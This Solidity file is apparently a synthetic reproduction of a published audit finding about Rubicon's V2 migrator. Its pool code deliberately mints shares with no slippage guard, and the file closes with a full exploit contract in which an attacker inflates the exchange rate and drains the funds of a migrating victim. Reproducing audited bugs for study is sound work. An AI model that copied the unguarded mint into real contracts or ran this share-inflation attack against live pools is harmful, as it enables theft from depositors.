// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Rubicon — [H-14] Users get less assets on migration due to price manipulation
    (Code4rena 2023-04-rubicon; #48953)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: V2Migrator.migrate() redeems BathV1 → underlying, then mints BathV2
    with no minOut / slippage guard. On a low-liquidity CToken, an attacker inflates
    exchangeRate (mint 1 share + donate) so the victim's mint rounds to 0 shares;
    attacker redeems the pool including the migrated funds.
    Vulnerable migrate mint path preserved with @> VULN markers. */

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Simple V1 bath: 1:1 shares to underlying.
contract BathV1 {
    MockERC20 public underlyingToken;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(MockERC20 u) {
        underlyingToken = u;
    }

    function deposit(uint256 amt) external {
        underlyingToken.transferFrom(msg.sender, address(this), amt);
        balanceOf[msg.sender] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function withdraw(uint256 shares) external returns (uint256 amountWithdrawn) {
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        amountWithdrawn = shares;
        underlyingToken.transfer(msg.sender, amountWithdrawn);
    }
}

/// @dev Minimal Compound CToken / BathV2.
contract BathV2 {
    MockERC20 public underlying;
    uint256 public totalSupply;
    mapping(address => uint256) public accountTokens;
    uint256 public constant initialExchangeRateMantissa = 1e18;

    constructor(MockERC20 u) {
        underlying = u;
    }

    function balanceOf(address a) external view returns (uint256) {
        return accountTokens[a];
    }

    function getCash() public view returns (uint256) {
        return underlying.balanceOf(address(this));
    }

    function exchangeRateStored() public view returns (uint256) {
        if (totalSupply == 0) return initialExchangeRateMantissa;
        return (getCash() * 1e18) / totalSupply;
    }

    function mint(uint256 mintAmount) external returns (uint256) {
        uint256 rate = exchangeRateStored();
        underlying.transferFrom(msg.sender, address(this), mintAmount);
        uint256 mintTokens = (mintAmount * 1e18) / rate;
        totalSupply += mintTokens;
        accountTokens[msg.sender] += mintTokens;
        return 0;
    }

    function redeem(uint256 redeemTokens) external returns (uint256) {
        uint256 rate = exchangeRateStored();
        uint256 underlyingAmount = (redeemTokens * rate) / 1e18;
        accountTokens[msg.sender] -= redeemTokens;
        totalSupply -= redeemTokens;
        underlying.transfer(msg.sender, underlyingAmount);
        return 0;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        accountTokens[msg.sender] -= amt;
        accountTokens[to] += amt;
        return true;
    }
}

/// @dev V2Migrator.migrate — no slippage protection on V2 mint.
contract V2Migrator {
    mapping(address => address) public v1ToV2Pools;

    function setPool(address v1, address v2) external {
        v1ToV2Pools[v1] = v2;
    }

    function migrate(BathV1 bathTokenV1) external {
        uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);
        require(bathBalance > 0, "migrate: ZERO AMOUNT");

        bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);
        uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);

        MockERC20 underlying = bathTokenV1.underlyingToken();
        address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];

        underlying.approve(bathTokenV2, amountWithdrawn);
        // @> VULN: mint has no minSharesOut — inflated exchangeRate can mint 0 shares
        require(BathV2(bathTokenV2).mint(amountWithdrawn) == 0, "migrate: MINT FAILED"); // @> VULN
        // FIX: require(shares >= minOut) or redeem-simulation slippage bound.

        BathV2 v2 = BathV2(bathTokenV2);
        v2.transfer(msg.sender, v2.balanceOf(address(this)));
    }
}

contract Actor {
    function depositV1(BathV1 v1, MockERC20 u, uint256 amt) external {
        u.approve(address(v1), amt);
        v1.deposit(amt);
    }

    function seedAndInflate(BathV2 v2, MockERC20 u, uint256 seed, uint256 donate) external {
        u.approve(address(v2), seed);
        require(v2.mint(seed) == 0, "seed mint");
        u.transfer(address(v2), donate);
    }

    function approveV1(BathV1 v1, address sp, uint256 amt) external {
        v1.approve(sp, amt);
    }

    function doMigrate(V2Migrator m, BathV1 v1) external {
        m.migrate(v1);
    }

    function redeemAll(BathV2 v2) external {
        v2.redeem(v2.balanceOf(address(this)));
    }
}

contract Exploit {
    MockERC20 public underlying; // CREATE 1
    BathV1 public v1; // CREATE 2
    BathV2 public v2; // CREATE 3
    V2Migrator public migrator; // CREATE 4 — vulnerable
    Actor public attacker; // CREATE 5
    Actor public victim; // CREATE 6

    uint256 public constant VICTIM_DEPOSIT = 100e18;
    uint256 public attackerProfit;

    constructor() {
        underlying = new MockERC20("TEST", "TEST");
        v1 = new BathV1(underlying);
        v2 = new BathV2(underlying);
        migrator = new V2Migrator();
        migrator.setPool(address(v1), address(v2));
        attacker = new Actor();
        victim = new Actor();

        underlying.mint(address(victim), VICTIM_DEPOSIT);
        victim.depositV1(v1, underlying, VICTIM_DEPOSIT);

        // seed (1) + donate (VICTIM_DEPOSIT)
        underlying.mint(address(attacker), 1 + VICTIM_DEPOSIT);
    }

    function run() external {
        attacker.seedAndInflate(v2, underlying, 1, VICTIM_DEPOSIT);
        require(v2.exchangeRateStored() > 1e18, "rate not inflated");

        victim.approveV1(v1, address(migrator), type(uint256).max);
        victim.doMigrate(migrator, v1);

        // Victim got 0 V2 shares after inflated mint
        require(v2.balanceOf(address(victim)) == 0, "victim shares should be 0");
        require(v1.balanceOf(address(victim)) == 0, "v1 should be empty");

        uint256 before = underlying.balanceOf(address(attacker));
        attacker.redeemAll(v2);
        attackerProfit = underlying.balanceOf(address(attacker)) - before;

        // Harm: attacker drains at least the victim's migrated underlying
        require(attackerProfit >= VICTIM_DEPOSIT, "victim funds not stolen");
    }
}
